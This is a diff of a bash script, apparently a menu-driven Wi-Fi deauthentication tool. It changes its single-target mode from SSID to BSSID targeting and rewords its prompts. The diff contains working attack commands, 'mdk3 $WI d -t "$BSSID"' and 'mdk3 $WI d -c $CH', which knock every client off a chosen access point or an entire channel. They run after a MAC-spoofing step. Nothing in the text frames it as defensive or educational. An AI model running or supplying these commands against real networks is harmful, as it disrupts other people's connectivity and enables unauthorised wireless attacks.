@@ -69,7 +69,7 @@ title
 echo -e $BOLD_CYAN
 echo " Choose an option:"
 echo " "
-echo -e "$BOLD_BLUE 1.$BOLD_WHITE Deauth a specific SSID"
+echo -e "$BOLD_BLUE 1.$BOLD_WHITE Deauth a specific BSSID"
 echo -e "$BOLD_BLUE 2.$BOLD_WHITE Deauth a whole channel"
 echo " "
 echo -n -e "$BOLD_WHITE > "
@@ -82,9 +82,9 @@ if [ $CHOICE == 1 ]; then
 	nmcli dev wifi
 	echo " "
 	echo -e -n $BOLD_CYAN
-	echo -n " Type the target SSID > "
+	echo -n " Type the target BSSID > "
 	echo -e -n $BOLD_WHITE
-	read SSID
+	read BSSID
 	clear
 	title
 	echo " "
@@ -92,10 +92,10 @@ if [ $CHOICE == 1 ]; then
 	read WI
 	echo " "
 	echo -e $BOLD_GREEN
-	echo "Starting the attack... If you want to stop it press CTRL+C"
+	echo "Starting the attack... Press CTRL+C to stop the attack."
 	changeMAC
 	trap coolexit EXIT
-	mdk3 $WI d -n "$SSID"
+	mdk3 $WI d -t "$BSSID"
 elif [ $CHOICE == 2 ]; then
 	title
 	echo -e $NO_COLOR
@@ -112,7 +112,7 @@ elif [ $CHOICE == 2 ]; then
 	read WI
 	echo " "
  	echo -e $BOLD_GREEN
-	echo -e " Starting the attack... If you want to stop it press CTRL+C."
+	echo -e "Starting the attack... Press CTRL+C to stop the attack."
 	changeMAC
 	trap coolexit EXIT
 	mdk3 $WI d -c $CH
